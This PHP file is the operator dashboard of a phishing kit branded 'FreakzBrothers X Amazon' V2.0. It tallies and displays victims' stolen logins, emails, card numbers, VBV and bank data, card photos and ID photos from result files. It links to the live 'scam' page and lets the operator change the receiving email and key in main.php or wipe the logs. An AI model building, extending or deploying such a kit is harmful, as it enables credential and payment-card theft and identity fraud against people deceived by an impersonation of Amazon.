<?php
/*
* #====================================================================================================================#
* ######################################################################################################################
* # ███████╗██████╗#███████╗#█████╗#██╗##██╗███████╗██████╗ ██████╗##██████╗#████████╗██╗##██╗███████╗██████╗#███████╗##
* # ██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║##██║██╔════╝██╔══██╗██╔════╝##
* # █████╗##██████╔╝█████╗##███████║█████╔╝###███╔╝#██████╔╝██████╔╝██║###██║###██║###███████║█████╗##██████╔╝███████╗##
* # ██╔══╝##██╔══██╗██╔══╝##██╔══██║██╔═██╗##███╔╝##██╔══██╗██╔══██╗██║###██║###██║###██╔══██║██╔══╝##██╔══██╗╚════██║##
* # ██║#####██║##██║███████╗██║##██║██║##██╗███████╗██████╔╝██║##██║╚██████╔╝###██║###██║##██║███████╗██║##██║███████║##
* # ╚═╝#####╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚═╝##╚═╝╚══════╝╚═════╝#╚═╝##╚═╝#╚═════╝####╚═╝###╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚══════╝##
* ######################################################################################################################
* ####################################### Copyright © FREAKZBROTHERS X AMAZON 2019 #####################################
* #====================================================================================================================#
*/

@require_once "../main.php";
error_reporting(0);
include '../config/config.php';
 
session_start();
if($_SESSION['user'] == ""){
header('location: ../login.php');
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
    header('location: ../login.php');
  }
  else{
    echo '';
  }
}
$click = "../result/total_click.txt";
$file = fopen($click, "r");
$total_click = fread($file, filesize($click));
$total_click = substr_count($total_click, "\n");
fclose($file);
if($total_click == 0) {
    $total_click = "$total_click";
}else{
    $total_click = "$total_click";
}

$click = "../result/total_login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "\n");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../result/total_cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "\n");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../result/total_vbv.txt";
$file = fopen($click, "r");
$total_vbv = fread($file, filesize($click));
$total_vbv = substr_count($total_vbv, "\n");
fclose($file);
if($total_vbv == 0) {
    $total_vbv = "$total_vbv";
}else{
    $total_vbv = "$total_vbv";
}

$click = "../result/total_bank.txt";
$file = fopen($click, "r");
$total_bank = fread($file, filesize($click));
$total_bank = substr_count($total_bank, "\n");
fclose($file);
if($total_bank == 0) {
    $total_bank = "$total_bank";
}else{
    $total_bank = "$total_bank";
}

$click = "../result/total_photocc.txt";
$file = fopen($click, "r");
$total_photo = fread($file, filesize($click));
$total_photo = substr_count($total_photo, "\n");
fclose($file);
if($total_photo == 0) {
    $total_photo = "$total_photo";
}else{
    $total_photo = "$total_photo";
}

$click = "../result/total_photoid.txt";
$file = fopen($click, "r");
$total_photoid = fread($file, filesize($click));
$total_photoid = substr_count($total_photoid, "\n");
fclose($file);
if($total_photoid == 0) {
    $total_photoid = "$total_photoid";
}else{
    $total_photoid = "$total_photoid";
}

$click = "../result/total_email.txt";
$file = fopen($click, "r");
$total_email = fread($file, filesize($click));
$total_email = substr_count($total_email, "\n");
fclose($file);
if($total_email == 0) {
    $total_email = "$total_email";
}else{
    $total_email = "$total_email";
}

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$total_botnya = fread($file, filesize($click));
$total_botnya = substr_count($total_botnya, "\n");
fclose($file);
if($total_botnya == 0) {
    $total_botnya = "$total_botnya";
}else{
    $total_botnya = "$total_botnya";
}

$click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
fclose($file);
?>
<!DOCTYPE html>
<html>

<head>
  <title>FreakzBrothers: Amazon</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="shortcut icon" href="amazon/Assets/img/favicon.ico" />
</head>

<body>
  <style type="text/css">
    .angka {
      font-weight: bold;
      font-size: 30px;
      float: right;
      margin-right: 10%
    }

    .text-warning {
      color: #FFC107
    }

    footer {
      font-size: 10px;
      font-weight: bold;
      font-family: arial;
      position: fixed;
      bottom: 0;
      right: 0;
      background: black;
      color: white;
      padding: 2px
    }

    .text-warning {
      color: #FFC107
    }
  </style>
<div class="container">
  <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
    <ul class="navbar-nav">
      <h1 style="display: inline-block; color: white;">&nbsp;&nbsp;&nbsp;<i class="fa fa-amazon spacer-small"></i>
        <but>
          <font color="red"><b>Freakz<font color="white">Brothers&nbsp;<font color="lime">V2.0</font>
            </b>
      </h1>
      </div>
  </nav><br>
<nav class="navbar navbar-expand-lg">
  <div class="container">
    <table class="table">
      <thead class="thead-white">
        <tr>
          <th>
            <div class="p-3 mb-2 bg-primary text-white"><i class="fa fa-users fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Visitor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo $total_click; ?></div>
          </th>
          <th>
            <div class="p-3 mb-2 bg-warning text-dark"><font color="white"><i class="fa fa-sign-in fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo $total_login; ?></font></div></th>
          <th>
            <div class="p-3 mb-2 bg-success text-dark"><font color="white"><i class="fa fa-envelope fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Email&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo $total_email; ?></font></div></th>
          <th>
            <div class="p-3 mb-2 bg-danger text-white"><i class="fa fa-credit-card fa-2x"></i><b>&nbsp;&nbsp;&nbsp;16Digit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo $total_cc; ?></div></th>
          <th>
            <div class="p-3 mb-2 bg-dark text-white"><i class="fa fa-bug fa-2x"></i><b>&nbsp;&nbsp;&nbsp;BOTs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo $total_botnya; ?></div></th>
      </thead>
    </table>

</div></nav><br>
<center><textarea style="resize:none;width:900px;height:280px;font-size:16px;font-color:black;font-family:consolas;" disabled=""><?php echo @file_get_contents("../result/log_visitor.txt"); ?></textarea></center>
<br>
  <form method="POST" action"">
    <center>
      <form method="POST" action""><button class="btn btn-link" type="submit" name="rd">
          <font color="orange"><b><i class="fa fa-trash"></i>&nbsp;&nbsp;&nbsp;RESET</b></font>
        </button>
        <a href="https://<?php echo $_SERVER['SERVER_NAME'] ?>/?<?php echo $parameter ?>" class="btn btn-link" target="_blank">
          <font color="red"><b><i class="fa fa-code"></i>&nbsp;&nbsp;&nbsp;VIEW SCAM</b></font>
        </a><a href="setting.php?account=on" class="btn btn-link">
          <font color="green"><b><i class="fa fa-cog"></i>&nbsp;&nbsp;&nbsp;SETTING</b></font>
        </a>
        <a href="?account=off" class="btn btn-link">
          <font color="blue"><b><i class="fa fa-sign-out"></i>&nbsp;&nbsp;&nbsp;SIGN-OUT</b></font>
        </a>
    </center>
  </form>
  <footer>
    <font color="green">Copyright</font> &copy; <font color="red">Freakz</font>
    <font color="white">Brothers</font> 2019.
  </footer>
</body>

</html>
 <?php
   unlink("set.php");
 
    $lama   = trim($_POST['lama']);
    $baru   = trim($_POST['baru']);
    $keylama = trim($_POST['keylama']);
    $keybaru = trim($_POST['keybaru']);
    $file   = "../main.php";
    $isi    = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['key'])) {
   if(preg_match("#\b$keylama\b#is", $isi)) {
        $isi = str_replace($keylama,$keybaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['rd'])) {
       unlink("../result/total_login.txt");
       unlink("../result/total_email.txt");
       unlink("../result/total_cc.txt");
       unlink("../result/total_vbv.txt");
       unlink("../result/total_bot.txt");
       unlink("../result/total_bin.txt");
       unlink("../result/total_photocc.txt");
       unlink("../result/total_photoid.txt");
       unlink("../result/total_click.txt");
       unlink("../result/total_bank.txt");
       unlink("../result/log_visitor.txt");
       unlink("error_result");

       echo "<script>alert('Success')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
     echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
?>